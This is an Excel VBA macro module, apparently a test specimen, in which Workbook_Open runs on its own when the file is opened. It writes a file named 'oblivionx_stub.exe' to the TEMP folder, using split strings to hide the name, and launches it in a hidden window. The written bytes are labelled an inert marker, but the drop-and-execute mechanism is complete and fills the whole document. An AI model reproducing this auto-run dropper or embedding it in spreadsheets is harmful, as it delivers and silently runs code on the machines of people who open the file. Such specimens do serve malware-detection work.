Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\obli" & "vionx_st" & "ub.exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-thi" & "s-is-an" & "-inert-ma" & "rker-s" & "tub"
    Close #f
    Shell exe, 0
End Sub
